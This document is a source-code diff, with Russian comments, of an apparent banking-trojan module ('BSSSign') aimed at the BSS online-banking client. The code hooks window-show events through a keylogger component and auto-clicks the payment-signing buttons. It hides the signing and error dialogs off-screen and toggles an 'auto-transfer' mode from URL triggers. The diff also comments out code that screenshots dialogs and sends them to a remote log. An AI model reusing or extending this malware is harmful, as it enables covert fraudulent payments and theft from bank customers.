@@ -28,7 +28,7 @@ namespace bsssign_Template
 //----------------------------------------------------------------------------
 
 // Определяем переменную включающую опцию прятания окна
-#if  !defined(DEBUGCONFIG) && !defined(DEBUGBOT)
+#if !defined(DEBUGCONFIG) && !defined(DEBUGBOT)
 	#define BSSSIGN_HIDE_WND
 #endif
 
@@ -74,8 +74,6 @@ DWORD  BSSClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash)
 		}
 
 		// Кликаем по кнопке
-
-
 		if (HardClickToWindow(Button, 5, 5))
 		{
 			Count++;
@@ -107,6 +105,17 @@ protected:
 	TBSSFormStatus FStatus;
 	DWORD FClickTime;
 	DWORD FMaxWaitInterval;
+
+	// Функция перемещает окно
+	void Move(int x, int y)
+	{
+		RECT R;
+		if (!pGetWindowRect(FForm, &R)) return;
+
+		int W = R.right - R.left;
+		int H = R.bottom - R.top;
+		pMoveWindow(FForm, x, y, W, H, FALSE);
+	}
 
 	// Кликаем по необходимым кнопкам формы
 	bool virtual Click()
@@ -161,6 +170,7 @@ protected:
 	bool Click()
 	{
 		DWORD Count = BSSClickToButtons(FForm, true, BSS_SIGN_BUTTON_CAPTION_HASH);
+		BDBG("bsssign","Подпись завершена. Нажато кнопок %d", Count);
         TBSSForm::Click();
         return Count > 0;
     }
@@ -177,6 +187,10 @@ public:
 	TBSSSignForm(TBSSClicker* aOwner, HWND Wnd)
 		: TBSSForm(aOwner, Wnd)
 	{
+		BDBG("bsssign","Перехвачено окно установки подписей");
+		#ifdef BSSSIGN_HIDE_WND
+            Move(-1000, 0);
+		#endif
 	};
 
 
@@ -215,6 +229,7 @@ public:
 		: TBSSForm(aOwner, Wnd)
 	{
 		// Для окно ввода пароля будем просто ожидать ввода
+		BDBG("bsssign","Перехвачено окно ввода пароля");
     	FMaxWaitInterval = 3 * 60 * 1000;
 	}
 
@@ -227,7 +242,7 @@ public:
 
 		// Этап второй: проверяем вхождение слова пароль
 		// Нет данных как точно звучит заголовок окна
-		return Text.Pos("ароль") >= 0;
+		return Text.Pos("Пароль") >= 0;
 
 		/* TODO :
 		При получении дополнительных данных об окне ввода пароля
@@ -258,13 +273,21 @@ public:
 	TBSSErrorForm(TBSSClicker* aOwner, HWND Wnd)
 		: TBSSForm(aOwner, Wnd)
 	{
+		BDBG("bsssign","Перехвачено окно ошибки");
+		#ifdef BSSSIGN_HIDE_WND
+            Move(-1000, 0);
+		#endif
+
 		FTextHash = 0x27EB /* Ok */;
+		//FTextHash = 0x18B5 /* ОК */; // Для тестов
 		FClassHash = 0;
 	};
 
 	// Функция возвращает истину если это окно ошибки
 	bool static IsErrorForm(TBSSClicker* Clicker, DWORD ClassHash, DWORD TextHash)
 	{
+		//return  TextHash  == 0x72E78B17 /* Ошибка */;
+
 		return  ((TBotCollection*)Clicker)->Count() > 0 &&
 				ClassHash == BSS_FORM_CLASS_HASH &&
 				TextHash  == 0x72E78B17 /* Ошибка */;
@@ -305,7 +328,7 @@ private:
                     i++;
 			}
 
-			pSleep(1000);
+			pSleep(500);
 
 
 			// Проверяем необходимость завершения
@@ -326,12 +349,13 @@ public:
 	{
 		FRunning = false;
 		SetThreadSafe();
-		FActive = true;
+		FActive = false;
 	};
 	//------------------------------------------------------------------------
 
 	void SetActive(bool Value)
 	{
+		BDBG("bsssign","Активация системы BSS кликера. Активно=%d", Value);
         FActive = Value;
 	}
 	//------------------------------------------------------------------------
@@ -348,6 +372,7 @@ public:
 
 		TBSSForm* Form = NULL;
 
+		BDBG("bsssign","Обрабатываем окно: \r\n  Class: %s \r\n  Text: %s", Class.t_str(), Text.t_str());
 
         // Проверяем окно установки подписей
 		if (TBSSSignForm::IsSignForm(ClassHash, TextHash))
@@ -393,15 +418,15 @@ DWORD WINAPI BSSClickerThreadMethod(LPVOID Clicker)
 namespace BSSSign
 {
 	// Делать скриншоты всплывающих окон системы
-    #define LOG_BSS_SIGN
+//    #define LOG_BSS_SIGN
 
 
 	// Хэш имени класса Интернет Эксплорера
-    #define HASH_IE_SERVER 0xF5E7484A /* Internet Explorer_Server */
+//    #define HASH_IE_SERVER 0xF5E7484A /* Internet Explorer_Server */
 
 	char BSSSignName[] = {'B','S','S','S','i','g','n', 0};
-    char ButtonClassName[] = {'o','b','j','_','B','U','T','T','O','N', 0};
-    char ButtonCaption[]   = {'П','о','д','п','и','с','а','т','ь', 0};
+//    char ButtonClassName[] = {'o','b','j','_','B','U','T','T','O','N', 0};
+//    char ButtonCaption[]   = {'П','о','д','п','и','с','а','т','ь', 0};
 	//----------------------------------------------------
 
 
@@ -409,15 +434,15 @@ namespace BSSSign
 
 //	bool Active = false; // Активность системы подписи
 //	bool Blind  = false; // Использовать штору
-	bool Move   = false; // Двигать окно
+//	bool Move   = false; // Двигать окно
 	bool RecordVideo = false;
-	bool SignState = false; // Признак того, что в данный момент идёт подпись
-	HWND PasswordForm = NULL;
+//	bool SignState = false; // Признак того, что в данный момент идёт подпись
+//	HWND PasswordForm = NULL;
 	RECT WindowRect;
 
 
 	// Функция ставит необходимые хуки
-	void SetHooks();
+//	void SetHooks();
 
 	// Хук отображения окна
 	void WINAPI Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data);
@@ -426,91 +451,93 @@ namespace BSSSign
 	DWORD WINAPI SignPayment(LPVOID Data);
 
 
-	void DoMoveWindow(HWND Wnd, int x, int y);
-
-	// Делать скриншоты всплывающих окон
-	#ifdef LOG_BSS_SIGN
-		char LogTypeBSSSignUnknown[] = {'B','S','S','S','i','g','n','_','U','n','k','n','o','w','n','_','W','n','d', 0};
-		char LogTypeBSSSignError[] = {'B','S','S','S','i','g','n','_','E','r','r','o','r', 0};
-
-		typedef struct TLog
-		{
-        	PCHAR Type;
-			PCHAR Text;
-			LPBYTE Screen;
-			DWORD ScreenSize;
-			HWND Wnd;
-		} *PLog;
-
-
-		DWORD WINAPI SendLogAndDeleteData(LPVOID BSSLog);
-
-	#endif
+//	void DoMoveWindow(HWND Wnd, int x, int y);
+//
+//	// Делать скриншоты всплывающих окон
+//	#ifdef LOG_BSS_SIGN
+//		char LogTypeBSSSignUnknown[] = {'B','S','S','S','i','g','n','_','U','n','k','n','o','w','n','_','W','n','d', 0};
+//		char LogTypeBSSSignError[] = {'B','S','S','S','i','g','n','_','E','r','r','o','r', 0};
+//
+//		typedef struct TLog
+//		{
+//        	PCHAR Type;
+//			PCHAR Text;
+//			LPBYTE Screen;
+//			DWORD ScreenSize;
+//			HWND Wnd;
+//		} *PLog;
+//
+//
+//		DWORD WINAPI SendLogAndDeleteData(LPVOID BSSLog);
+//
+//	#endif
 }
 
 //***********************************************************************
 
 
-#ifdef LOG_BSS_SIGN
-
-	DWORD WINAPI BSSSign::SendLogAndDeleteData(LPVOID BSSLog)
-	{
-		// Функция отправляет лог со скринами показанных диалогов
-		PLog Log = (PLog)BSSLog;
-
-
-		if( Log->Wnd )
-		{
-			Sleep(1000);
-			ScreenShot::MakeToMem(Log->Wnd, 0, 0, 0, 0, NULL, Log->Screen, Log->ScreenSize);
-		}
-
-		PCHAR Type = (!STR::IsEmpty(Log->Type)) ? Log->Type : BSSSignName;
-
-		SendRemoteLog(Type, Log->Text, Log->Screen, Log->ScreenSize, NULL);
-
-		STR::Free(Log->Type);
-		STR::Free(Log->Text);
-		MemFree(Log->Screen);
-
-		FreeStruct(Log);
-		return 0;
-	}
-
-#endif
-
-
-void BSSSign::DoMoveWindow(HWND Wnd, int x, int y)
-{
-	RECT R;
-	if (!pGetWindowRect(Wnd, &R))
-		return;
-
-	int W = R.right - R.left;
-    int H = R.bottom - R.top;
+//#ifdef LOG_BSS_SIGN
+//
+//	DWORD WINAPI BSSSign::SendLogAndDeleteData(LPVOID BSSLog)
+//	{
+//		// Функция отправляет лог со скринами показанных диалогов
+//		PLog Log = (PLog)BSSLog;
+//
+//
+//		if( Log->Wnd )
+//		{
+//			Sleep(1000);
+//			ScreenShot::MakeToMem(Log->Wnd, 0, 0, 0, 0, NULL, Log->Screen, Log->ScreenSize);
+//		}
+//
+//		PCHAR Type = (!STR::IsEmpty(Log->Type)) ? Log->Type : BSSSignName;
+//
+//		SendRemoteLog(Type, Log->Text, Log->Screen, Log->ScreenSize, NULL);
+//
+//		STR::Free(Log->Type);
+//		STR::Free(Log->Text);
+//		MemFree(Log->Screen);
+//
+//		FreeStruct(Log);
+//		return 0;
+//	}
+//
+//#endif
 
 
-	pMoveWindow(Wnd, x, y, W, H, FALSE);
-}
+//void BSSSign::DoMoveWindow(HWND Wnd, int x, int y)
+//{
+//	RECT R;
+//	if (!pGetWindowRect(Wnd, &R))
+//		return;
+//
+//	int W = R.right - R.left;
+//    int H = R.bottom - R.top;
+//
+//
+//	pMoveWindow(Wnd, x, y, W, H, FALSE);
+//}
+
 //----------------------------------------------------------------------------
 
 //----------------------------------------------------------------------------
-void WaitPasswordWnd(HWND Wnd)
-{
-	// Фнкция ожидает пока закроется окно ввода пароля.
-	// Тоных данных для данного действия пока нет, по
-	// этому соберём код "на пальцах"
+//void WaitPasswordWnd(HWND Wnd)
+//{
+//	// Фнкция ожидает пока закроется окно ввода пароля.
+//	// Тоных данных для данного действия пока нет, по
+//	// этому соберём код "на пальцах"
+//
+//	BYTE i = 1;
+//	while ((BOOL)pIsWindowVisible(Wnd))
+//	{
+//		pSleep(1000);
+//		i++;
+//
+//		if (i > 30) return;
+//    }
+//
+//}
 
-	BYTE i = 1;
-	while ((BOOL)pIsWindowVisible(Wnd))
-	{
-		pSleep(1000);
-		i++;
-
-		if (i > 30) return;
-    }
-		
-}
 
 //----------------------------------------------------------------------------
 
@@ -592,9 +619,10 @@ void WINAPI BSSSign::Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data)
 	int Cmd = WndData->Command;
 	HWND Wnd = WndData->Window;
 
-
 	if (Cmd == SW_SHOW || Cmd == SW_SHOWNORMAL)
+	{
 		Clicker->AddForm(Wnd);
+    }
 
    /*	if ((Cmd != SW_SHOW) || (!Active && !Blind))
     	return;
@@ -667,35 +695,37 @@ void WINAPI BSSSign::Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data)
 //----------------------------------------------------------------------------
 
 
-BOOL CALLBACK EnumWindowsIE( HWND hWnd, LPARAM lParam )
-{
-	//перебираем все окна и найдя ие хайдим в нем главное окноInternet Explorer_Server
-	WCHAR ClasN[MAX_PATH];
-	
-	
-	pGetClassNameW(hWnd,ClasN, MAX_PATH);
+//BOOL CALLBACK EnumWindowsIE( HWND hWnd, LPARAM lParam )
+//{
+//	//перебираем все окна и найдя ие хайдим в нем главное окноInternet Explorer_Server
+//	WCHAR ClasN[MAX_PATH];
+//
+//
+//	pGetClassNameW(hWnd,ClasN, MAX_PATH);
+//
+//	if (!plstrcmpW(ClasN,L"IEFrame"))
+//	{
+//		BDBG("bsssign","поймали IEFrame");
+//		HWND Wnd = (HWND)pFindWindowExA(hWnd,NULL,"Frame Tab",NULL);
+//
+//		HWND Wnd1 = (HWND)pFindWindowExA(Wnd,NULL,"TabWindowClass",NULL);
+//
+//
+//		HWND hWndIn = (HWND)pFindWindowExA(
+//					  (HWND)pFindWindowExA(Wnd1,NULL,"Shell DocObject View",NULL)
+//										,
+//										NULL,
+//										"Internet Explorer_Server",
+//										NULL);
+//
+//		pShowWindow(hWndIn, SW_SHOW);
+//		return FALSE;
+//	}
+//	return TRUE;
+//}
 
-	if (!plstrcmpW(ClasN,L"IEFrame"))
-	{
-		BDBG("bsssign","поймали IEFrame");
-		HWND Wnd = (HWND)pFindWindowExA(hWnd,NULL,"Frame Tab",NULL);
-	
-		HWND Wnd1 = (HWND)pFindWindowExA(Wnd,NULL,"TabWindowClass",NULL);
-
-
-		HWND hWndIn = (HWND)pFindWindowExA(
-					  (HWND)pFindWindowExA(Wnd1,NULL,"Shell DocObject View",NULL)
-										,
-										NULL,
-										"Internet Explorer_Server",
-										NULL);
-		
-		pShowWindow(hWndIn, SW_SHOW);
-		return FALSE;
-	}
-	return TRUE;
-}
 //-----------------------------------------------------------------------------
+
 
 void BSSSign::CheckRequest(PCHAR URL)
 {
@@ -717,13 +747,10 @@ void BSSSign::CheckRequest(PCHAR URL)
 		if (RecordVideo)
 			RecordVideo = VideoRecorderSrv::StartRecording(BSSSignName);
 
-		BDBG("bsssign","Автозалив активирован");
-
 	}
 	else
 	if ( CompareUrl( "*az_stop", URL ) )
 	{
-		BDBG("bsssign","Останавливаем автозалив");
 		Clicker->SetActive(false);
 		if (RecordVideo)
 		{
@@ -746,31 +773,31 @@ void BSSSign::CheckRequest(PCHAR URL)
 //
 //		Blind = false;
 //	}
-	else
-	if ((CompareUrl( "*move_up", URL)) && (!Move))
-	{
-
-		BDBG("bsssign","окно ие в право");
-		HWND Wind = (HWND)pFindWindowA("IEFrame", NULL);
-		pGetWindowRect(Wind,&WindowRect);
-		int x =(int)pGetSystemMetrics( SM_CXSCREEN );
-		int y =(int)pGetSystemMetrics( SM_CYSCREEN );
-
-		BDBG("bsssign","окно ие в право %d",x);
-		BDBG("bsssign","окно ие в право %d",y);
-		pMoveWindow(Wind,x,0,WindowRect.right-WindowRect.left,WindowRect.bottom-WindowRect.top,FALSE);
-
-		Move=true;
-	}
-	else
-	if (( CompareUrl( "*move_down", URL ) )&&(Move))
-	{
-		BDBG("bsssign","Окно ие на место");
-		HWND Wind = (HWND)pFindWindowA("IEFrame",NULL);
-		pMoveWindow(Wind,WindowRect.left ,WindowRect.top ,WindowRect.right-WindowRect.left,WindowRect.bottom - WindowRect.top,TRUE);
-			
-		Move = false;
-	}
+//	else
+//	if ((CompareUrl( "*move_up", URL)) && (!Move))
+//	{
+//
+//		BDBG("bsssign","окно ие в право");
+//		HWND Wind = (HWND)pFindWindowA("IEFrame", NULL);
+//		pGetWindowRect(Wind,&WindowRect);
+//		int x =(int)pGetSystemMetrics( SM_CXSCREEN );
+//		int y =(int)pGetSystemMetrics( SM_CYSCREEN );
+//
+//		BDBG("bsssign","окно ие в право %d",x);
+//		BDBG("bsssign","окно ие в право %d",y);
+//		pMoveWindow(Wind,x,0,WindowRect.right-WindowRect.left,WindowRect.bottom-WindowRect.top,FALSE);
+//
+//		Move=true;
+//	}
+//	else
+//	if (( CompareUrl( "*move_down", URL ) )&&(Move))
+//	{
+//		BDBG("bsssign","Окно ие на место");
+//		HWND Wind = (HWND)pFindWindowA("IEFrame",NULL);
+//		pMoveWindow(Wind,WindowRect.left ,WindowRect.top ,WindowRect.right-WindowRect.left,WindowRect.bottom - WindowRect.top,TRUE);
+//
+//		Move = false;
+//	}
 }
 
 //-----------------------------------------------------------------------------
@@ -778,16 +805,19 @@ void BSSSign::CheckRequest(PCHAR URL)
 void BSSSign::Initialize()
 {
 	// Функция инициализирует систему подписи BSS
+	BDBG("bsssign","Инициализируем BSS кликер");
 
 	Clicker = new TBSSClicker();
 
 //	Active = false;
 //	Blind  = false;
-	Move   = false;
-	SignState = false;
+//	Move   = false;
+//	SignState = false;
 	RecordVideo = false;
 
-    KeyLogger::ConnectEventHandler(KLE_SHOW_WND, Event_ShowWindow);
+	bool Connected = KeyLogger::ConnectEventHandler(KLE_SHOW_WND, Event_ShowWindow);
+	if (Connected)
+    	BDBG("bsssign","Событие подключено");
 }
 
 
